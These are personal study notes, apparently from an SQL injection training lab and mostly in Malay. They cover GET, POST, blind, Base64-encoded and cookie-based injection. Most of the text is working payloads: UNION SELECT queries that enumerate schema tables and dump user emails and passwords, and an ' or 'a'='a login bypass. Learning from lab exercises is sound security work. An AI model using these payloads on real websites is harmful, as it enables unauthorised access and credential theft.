# SQL-Injection-Training-Lab-notes
SQL Injection Training Lab notes for myself

## Level A - Basic GET SQL Injection
first payload for sqli `'` `"` `\` `)'` `}'` `\'` to test injectable

example page error after, use payload `'`

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/4e32639f-6c0e-4c82-bf67-317bc2ff01df)

if blind base does not have error

example page injectable and back to normal page after, use payload `'--+`
`--` komen untuk sql
`+` untuk space di url

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/417f7304-7b32-4688-8702-e50e97ce6bad)

payload `'+order+by+6--+` untuk cari berapa column yang ada dlm db, contoh sampai 6 dpt error bermaksud ada 5 colomn dlm db ini

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/728fa968-dfb5-4570-a786-c663f8b35833)

payload `?id=-1'+union+all+select+1,2,3,4,5--+` untuk tgk username dan email dikeluarkan berada di column no berapa, berdasarkan gambar bawah username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace apa2 code contoh `@@version` untuk check version , `database()` untuk check nama db, `user()` untuk check username db. jika string union all select detect guna hex iaitu %61 atau no2 lain
 
![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e68c2dec-1ada-4a95-82de-d3c84da608fc)

payload `?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables--+` untuk senaraikan semua db table dlm db information_schema

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/75903416-fec8-4ba8-b5a1-d6befaa5ec0f)

payload `?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables+where+table_schema=database()--+` untuk filter untuk current db sahaja mcm payload atas

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/c3f53df9-f9db-4f76-9c1c-a5f5fd80db56)

payload `?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()--+` untuk display semua jenis column untuk db 

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5c3f8a18-58f9-450b-8b34-6744b7f72d59)

payload `?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='users'--+` untuk display semua jenis column untuk db table users

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/20974b51-155d-44e1-b871-609104d9eebd)

payload `?id=-1'+union+all+select+1,group_concat(email),group_concat(password),4,5+from+users--+` untuk display email dan password sebab kita dah tahu table mana untuk guna

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/9dd9dab2-4e32-46bd-add4-1fe787a87b68)

## Level B - Basic POST SQL Injection
beza get dgn post, kalu post tiada di url, kalu ada dia get

payload `user1'` untuk test error page

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/9b258237-6335-4e64-84cd-e29f02e2776b)

payload `user1'-- ` untuk test vuln dan back to normal page, tips guna `space` untuk ganti `+` di get method

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/e2337ce0-2c05-440b-85ba-c5aea13b2fd2)

payload `user1'order by 5-- ` untuk cari berapa column yang ada dlm db, contoh sampai 6 dpt error bermaksud ada 5 colomn dlm db ini
![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/f1887807-0685-4449-b862-9c7a6161d3c8)

payload `user-1'union all select 1,2,3,4,5-- ` untuk tgk username dan email dikeluarkan berada di column no berapa, berdasarkan gambar bawah username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace apa2 code

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/779ad3ae-ad74-440d-b9c9-699f86e803c4)

payload `user-1'union all select 1,group_concat(table_name),3,4,5 from information_schema.tables-- ` untuk senaraikan semua db table dlm db information_schema

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/31af9e0f-04ac-4619-a3be-74ae349f2f92)

payload `user-1'union all select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()-- ` mcm step atas tapi ini filter kpd current db

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bc76091e-ebe5-494d-83c1-f2347a55f614)

payload `user-1'union all select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name='users' and table_schema=database()-- ` untuk display semua jenis column untuk db table users

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5f3e4061-f448-4a3d-9985-f9624eee7177)

payload `user-1'union all select 1,group_concat(email),group_concat(password),4,5 from users-- ` untuk senarai email dan password

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/dc5c638f-be2f-4c0c-b3f9-5d86750151c9)

## Level C - POST Bypass Auth
payload `'` untuk check error

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/6ba94a2a-bda7-4d3e-8305-d6582f79378b)

payload `'-- ` untuk repair error dan page ni vuln

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/fd5010f6-14d0-4c94-9edf-03ea16485da9)

payload `' or 'a' = 'a` untuk bypass login dan letak di password sekali, auto dpt masuk

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/f30df5d1-917f-4475-aabf-e3b9a0631812)

## Level D - GET Blind Based
blind sama dgn get method

payload `'` untuk test error page tapi blind tiada error atau data tk keluar page mcm gambar

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/622c5881-2e02-498b-b282-16e20422c651)

payload `'--+` untuk repair dan page vuln

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/7f368d86-c3f8-4dc7-abc5-d3fa1cb2b789)

payload `'+order+by+5--+` untuk cari berapa column yg ada dlm db contoh 6 dpt blind error so db ada 5 column

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/bbccdea2-3ebb-4987-9704-8a587d2299d1)

payload `?id=-1'+union+all+select+1,2,3,4,5--+` untuk tgk username dan email dikeluarkan berada di column no berapa, berdasarkan gambar bawah username terletak di col 2 dan email terletak di col 3, `2,3` boleh replace apa2 code

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/d1a51e4f-3619-4ea8-ab1d-2a9d67def8e2)

seterusnya step sama dgn get method

## Level E - Base64 GET SQL Injection

maksud encoded ialah berbeza bentuk contoh biasa Base64
Base64 `a-z` `A-Z` `0-9` `/` `+` dan 4 data iaitu `XX==` `XXX=` `XXXX`

payload `1'` convert `MSc=` untuk check error page

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/8ae0dcee-a744-4c48-9f98-b1504516374e)

payload `1'-- ` convert `MSctLSA=` untuk repair page dan vuln page

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5452bec6-df24-4917-9c15-44fe740658ad)

payload `1' order by 5-- ` convert `MScgb3JkZXIgYnkgNS0tIA==` kenapa 5 sebab db ada 5 column dan 6 dpt error

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/5a8141c0-ae0f-40da-bbca-565ca9a7e62f)

payload `-1' union all select 1,2,3,4,5-- ` convert `LTEnIHVuaW9uIGFsbCBzZWxlY3QgMSwyLDMsNCw1LS0g` untuk check name dan email berada di column mana dlm db

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/3ff88ac0-e86a-4e67-8444-b748dec2f61f)

dan step seterusnya sama dgn level lain.

## Level H - Cookie Base SQL Injection
untuk check cookie buka `developer tools` atau button `f12` atau `inspect element` di browser bahagian console taip `document.cookie`
dan cookie disimpan di browser

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/c75cd5b3-a35f-4532-b367-d2ac0bae1b0d)

payload `document.cookie = "userid=2"` untuk tukar kpd user 2

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/afc4f45f-14b4-4630-b112-35f95ff72dd7)

payload `document.cookie = "userid=2'"` untuk check error page

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/33eb3578-4dcb-490b-bb42-e47d96dc5b34)

payload `document.cookie = "userid=1'-- -"` untuk repair dan page ada vuln

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/7fa4c83f-7ff9-47f2-bdfd-6571455c7053)

payload  `document.cookie = "userid=-1'union all select 1,2,3,4,5 -- -"` untuk check name dan email berada di  column mana dlm db

![image](https://github.com/0hanif0/SQL-Injection-Training-Lab-notes/assets/23289982/d1bb83ee-4f2c-4f67-97e8-848717a43582)

dan step seterunya sama dgn level sebelumnya
